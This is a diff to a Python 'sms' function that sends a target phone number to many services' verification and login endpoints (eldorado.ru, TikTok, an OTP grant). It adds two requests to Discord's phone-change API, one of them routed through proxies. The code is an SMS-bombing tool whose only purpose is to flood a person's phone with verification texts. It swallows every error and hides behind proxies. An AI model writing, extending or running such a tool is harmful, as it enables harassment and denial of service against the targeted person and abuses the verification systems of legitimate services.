@@ -104,6 +104,15 @@ def sms(prx, number, tm):
 				    pass
 
 				try:
+				    payload = {
+				        "change_phone_reason": "user_action_required",
+				        "phone": f"+{number}"
+				    }
+				    requests.post("https://discord.com/api/v9/users/@me/phone", json = payload, proxies = proxies)
+				except:
+				    pass
+
+				try:
 					payload = {
 						"client_id": "broker_otp_guest2",
 						"grant_type": "password",
@@ -372,6 +381,15 @@ def sms(prx, number, tm):
 					requests.post("https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php", params = {"user_login": number}, headers=header)
 				except:
 					pass
+
+				try:
+				    payload = {
+				        "change_phone_reason": "user_action_required",
+				        "phone": f"+{number}"
+				    }
+				    requests.post("https://discord.com/api/v9/users/@me/phone", json = payload)
+				except:
+				    pass
 
 				try:
 					requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7", "Mobile": number, "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=header)
